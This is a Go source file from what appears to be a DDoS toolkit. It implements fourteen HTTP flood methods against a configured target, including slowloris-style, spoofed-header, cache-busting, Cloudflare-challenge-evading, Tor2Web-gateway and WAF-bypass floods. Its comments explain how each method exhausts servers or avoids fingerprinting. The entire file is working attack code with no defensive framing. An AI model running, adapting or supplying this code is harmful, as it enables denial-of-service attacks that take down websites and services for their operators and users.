package layer7

import (
	"context"
	"fmt"
	mrand "math/rand/v2"
	"net/url"
	"strings"
	"time"

	"net"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
)

// RawAttack implements attacks using raw TCP/TLS connections
type RawAttack struct {
	Config *core.AttackConfig
	Method string
}

func NewRawAttack(cfg *core.AttackConfig, method string) *RawAttack {
	return &RawAttack{
		Config: cfg,
		Method: method,
	}
}

func (r *RawAttack) Attack(ctx context.Context) error {
	switch r.Method {
	case "SLOW":
		return r.executeSLOW(ctx)
	case "NULL":
		return r.executeNULL(ctx)
	case "PPS":
		return r.executePPS(ctx)
	case "DYN":
		return r.executeDYN(ctx)
	case "EVEN":
		return r.executeEVEN(ctx)
	case "GSB":
		return r.executeGSB(ctx)
	case "AVB":
		return r.executeAVB(ctx)
	case "CFBUAM":
		return r.executeCFBUAM(ctx)
	case "BOT":
		return r.executeBOT(ctx)
	case "DOWNLOADER":
		return r.executeDOWNLOADER(ctx)
	case "KILLER":
		return r.executeKILLER(ctx)
	case "TOR":
		return r.executeTOR(ctx)
	case "RHEX":
		return r.executeRHEX(ctx)
	case "STOMP":
		return r.executeSTOMP(ctx)
	default:
		return nil
	}
}

func (r *RawAttack) executeSLOW(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)
	conn.Write([]byte(headers))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(headers)))

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(time.Duration(r.Config.RPC) * time.Millisecond / 15):
			keepAlive := fmt.Sprintf("X-a: %d\r\n", utils.RandInt(1, 5000))
			conn.Write([]byte(keepAlive))
			r.Config.BytesSent.Add(int64(len(keepAlive)))
		}
	}
	return nil
}

func (r *RawAttack) executeNULL(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		headers := BuildRawHeaders(r.Config.Target, r.Config)
		headers = strings.ReplaceAll(headers, "User-Agent:", "User-Agent: null\r\n#")
		headers += "Referrer: null\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executePPS(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		request := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			targetURL.Path, targetURL.Host)
		n, err := conn.Write([]byte(request))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeDYN(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	randomPrefix := utils.RandString(6)
	spoofIP := utils.RandIPv4()

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path)
		headers += fmt.Sprintf("Host: %s.%s\r\n", randomPrefix, targetURL.Host)
		if len(r.Config.UserAgents) > 0 {
			headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[mrand.IntN(len(r.Config.UserAgents))])
		}
		headers += fmt.Sprintf("X-Forwarded-For: %s\r\n", spoofIP)
		headers += "Connection: keep-alive\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeEVEN(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)
	conn.Write([]byte(headers))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(headers)))

	buf := make([]byte, 1024)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			break
		}

		conn.Write([]byte(headers))
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(len(headers)))
	}
	return nil
}

func (r *RawAttack) executeGSB(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		randomQS := utils.RandString(6)
		path := targetURL.Path
		if path == "" {
			path = "/"
		}

		headers := fmt.Sprintf("HEAD %s?qs=%s HTTP/1.1\r\n", path, randomQS)
		headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
		if len(r.Config.UserAgents) > 0 {
			headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[mrand.IntN(len(r.Config.UserAgents))])
		}
		headers += "Connection: Keep-Alive\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeAVB(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		delay := time.Duration(r.Config.RPC) * time.Millisecond / 1000
		if delay > 0 {
			time.Sleep(delay)
		}

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeCFBUAM(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)

	conn.Write([]byte(headers))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(headers)))

	time.Sleep(5010 * time.Millisecond)

	startTime := time.Now()
	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		if time.Since(startTime) > 120*time.Second {
			break
		}

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeBOT(_ context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	userAgent := "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

	robotsReq := fmt.Sprintf("GET /robots.txt HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", targetURL.Host, userAgent)
	conn.Write([]byte(robotsReq))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(robotsReq)))

	// Simplified BOT logic
	return nil
}

func (r *RawAttack) executeDOWNLOADER(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn.Write([]byte(headers))
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(len(headers)))

		buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if err != nil || n == 0 {
				break
			}
		}
	}
	return nil
}

func (r *RawAttack) executeKILLER(ctx context.Context) error {
	// KILLER logic: Aggressive multi-threaded flood with random connection cycling and high-frequency requests.
	// We simulate a high-intensity "GoldenEye" style attack where we mix Keep-Alive with No-Cache
	// and use random headers to exhaust server resources.

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn, err := CreateRawConnection(r.Config.Target, r.Config)
		if err != nil {
			continue
		}

		// We keep the connection open for a short burst to maximize throughput
		// then close it to force the server to handle connection tear-down
		go func(conn net.Conn) {
			defer conn.Close()

			// Short burst of 5-10 requests
			burstSize := 5 + mrand.IntN(5)

			targetURL, _ := url.Parse(r.Config.Target)
			path := targetURL.Path
			if path == "" {
				path = "/"
			}

			for j := 0; j < burstSize; j++ {
				// Randomize headers slightly to avoid easy fingerprinting
				headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
				headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
				if len(r.Config.UserAgents) > 0 {
					headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[mrand.IntN(len(r.Config.UserAgents))])
				}
				headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				headers += "Accept-Language: en-US,en;q=0.5\r\n"
				headers += "Accept-Encoding: gzip, deflate\r\n"
				// No-Cache forces re-computation on some servers
				headers += "Cache-Control: no-cache\r\n"
				headers += "Pragma: no-cache\r\n"
				headers += "Connection: keep-alive\r\n\r\n"

				n, err := conn.Write([]byte(headers))
				if err != nil {
					return
				}
				r.Config.RequestsSent.Add(1)
				r.Config.BytesSent.Add(int64(n))

				// Small delay to prevent local socket exhaustion too quickly
				time.Sleep(10 * time.Millisecond)
			}
		}(conn)
	}
	return nil
}

func (r *RawAttack) executeTOR(ctx context.Context) error {
	// TOR logic: Uses Tor2Web gateways to reach .onion sites without a local Tor client.
	// If the target is not an .onion site, this falls back to a standard proxied attack
	// (assuming the user might have provided a SOCKS proxy that resolves to Tor).

	targetURL, err := url.Parse(r.Config.Target)
	if err != nil {
		return err
	}

	isOnion := strings.HasSuffix(targetURL.Hostname(), ".onion")

	// Extended list of Tor2Web gateways
	tor2webs := []string{
		"onion.city", "onion.cab", "onion.direct", "onion.sh", "onion.link",
		"onion.ws", "onion.pet", "onion.rip", "onion.plus", "onion.top",
		"onion.moe", "onion.ly", "onion.dog", "onion.wiki",
	}

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Calculate target host
		targetHost := targetURL.Hostname()
		if isOnion {
			// Rotate gateways
			gateway := tor2webs[mrand.IntN(len(tor2webs))]
			targetHost = strings.Replace(targetHost, ".onion", "."+gateway, 1)
		}

		// Reconstruct target URL string with new host
		// Note: We don't change the r.Config.Target permanently, just for this connection
		newTarget := strings.Replace(r.Config.Target, targetURL.Hostname(), targetHost, 1)

		conn, err := CreateRawConnection(newTarget, r.Config)
		if err != nil {
			continue
		}

		// Build headers with the NEW host
		headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path) // Path remains same
		headers += fmt.Sprintf("Host: %s\r\n", targetHost)
		if len(r.Config.UserAgents) > 0 {
			headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[mrand.IntN(len(r.Config.UserAgents))])
		}
		headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		headers += "Connection: keep-alive\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err == nil {
			r.Config.RequestsSent.Add(1)
			r.Config.BytesSent.Add(int64(n))
		}
		conn.Close()
	}
	return nil
}

func (r *RawAttack) executeRHEX(ctx context.Context) error {
	// RHEX: Random Hex Path Attack.
	// Bypasses caches (Varnish, CDN) by requesting random non-existent paths.
	// This forces the backend to process the request and return 404, consuming CPU.

	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	hexSizes := []int{32, 64, 128}

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Generate random HEX path
		randHex := fmt.Sprintf("%x", utils.RandomBytes(hexSizes[mrand.IntN(len(hexSizes))]))

		// Construct request
		headers := fmt.Sprintf("GET %s/%s HTTP/1.1\r\n", targetURL.Path, randHex)

		// Some CDNs allow bypassing cache if Host header is manipulated (rare, but used in some tools)
		// Here we stick to standard Host but ensure path is unique
		headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)

		if len(r.Config.UserAgents) > 0 {
			headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[mrand.IntN(len(r.Config.UserAgents))])
		}
		headers += "Cache-Control: no-cache, must-revalidate\r\n"
		headers += "Pragma: no-cache\r\n"
		headers += "Connection: keep-alive\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeSTOMP(ctx context.Context) error {
	// STOMP: Uses a specific hex obfuscation pattern to bypass WAFs.
	// The payload "\x84\x8B..." is often used to trigger specific parsing bugs or bypass inspection.

	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)

	// Specific hex pattern (commonly used in MHDDoS)
	hexPattern := "\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA"
	hexh := strings.Repeat(hexPattern, 5) // Repeated pattern

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Method 1: Malformed Path with hex
		p1 := fmt.Sprintf("GET %s/%s HTTP/1.1\r\n", targetURL.Path, hexh)
		p1 += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
		if len(r.Config.UserAgents) > 0 {
			p1 += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[mrand.IntN(len(r.Config.UserAgents))])
		}
		p1 += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		p1 += "Connection: keep-alive\r\n\r\n"

		if _, err := conn.Write([]byte(p1)); err == nil {
			r.Config.RequestsSent.Add(1)
			r.Config.BytesSent.Add(int64(len(p1)))
		}

		// Method 2: Malformed Host (sometimes bypasses checks if WAF parses only Host header)
		// Note: This might invalidly target backend, but is part of the 'STOMP' effectiveness
		p2 := fmt.Sprintf("POST %s HTTP/1.1\r\n", targetURL.Path)
		p2 += fmt.Sprintf("Host: %s\r\n", hexh)
		p2 += "Content-Type: application/x-www-form-urlencoded\r\n"
		p2 += "Content-Length: 0\r\n\r\n"

		if _, err := conn.Write([]byte(p2)); err == nil {
			r.Config.RequestsSent.Add(1)
			r.Config.BytesSent.Add(int64(len(p2)))
		}
	}
	return nil
}
